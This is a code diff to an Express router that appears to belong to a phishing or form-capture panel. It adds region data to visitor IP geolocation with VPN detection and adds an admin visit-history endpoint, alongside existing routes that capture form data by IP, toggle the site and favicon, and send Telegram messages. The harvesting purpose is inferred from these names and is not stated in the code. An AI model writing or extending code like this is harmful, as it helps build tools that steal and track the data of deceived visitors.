@@ -1,6 +1,6 @@
 import { Router, type IRouter, type Request, type Response } from "express";
 import healthRouter from "./health";
-import { globalProvider, getSiteActive, setSiteActive, getFaviconChoice, setFaviconChoice, captureFormDataHTTP, readCapturesByIp, deleteCapturesByIp } from "../ws.js";
+import { globalProvider, getSiteActive, setSiteActive, getFaviconChoice, setFaviconChoice, captureFormDataHTTP, readCapturesByIp, deleteCapturesByIp, readVisitHistory } from "../ws.js";
 import { getTelegramStatus, saveTelegramConfig, sendTelegramMessage } from "../lib/telegram.js";
 
 const router: IRouter = Router();
@@ -77,19 +77,19 @@ router.get('/location', async (req: Request, res: Response) => {
     /^172\.(1[6-9]|2\d|3[01])\./.test(ip);
 
   if (isLocal) {
-    return res.json({ city: 'Local Network', country: 'Local', countryCode: 'XX', flag: '🖥️', isVpn: false, ip });
+    return res.json({ city: 'Local Network', region: 'Local', country: 'Local', countryCode: 'XX', flag: '🖥️', isVpn: false, ip });
   }
 
   try {
-    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,country,countryCode,proxy,hosting`);
-    const data = await (r.json() as Promise<{ status: string; city: string; country: string; countryCode: string; proxy: boolean; hosting: boolean }>);
+    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,countryCode,proxy,hosting`);
+    const data = await (r.json() as Promise<{ status: string; city: string; regionName: string; country: string; countryCode: string; proxy: boolean; hosting: boolean }>);
     if (data.status === 'success') {
       const flag = data.countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
-      return res.json({ city: data.city, country: data.country, countryCode: data.countryCode, flag, isVpn: data.proxy || data.hosting, ip });
+      return res.json({ city: data.city, region: data.regionName, country: data.country, countryCode: data.countryCode, flag, isVpn: data.proxy || data.hosting, ip });
     }
   } catch { /* fall through */ }
 
-  return res.json({ city: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐', isVpn: false, ip });
+  return res.json({ city: 'Unknown', region: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐', isVpn: false, ip });
 });
 
 router.post('/capture', (req: Request, res: Response) => {
@@ -107,6 +107,11 @@ router.get('/capture-log', (req: Request, res: Response) => {
   if (!ip) return res.status(400).json({ error: 'ip required' });
   const entries = readCapturesByIp(ip);
   return res.json({ entries });
+});
+
+router.get('/visit-history', (req: Request, res: Response) => {
+  if (!isAuthorizedAdmin(req)) return res.status(401).json({ error: 'Unauthorized' });
+  return res.json({ visits: readVisitHistory() });
 });
 
 router.delete('/capture-log', (req: Request, res: Response) => {
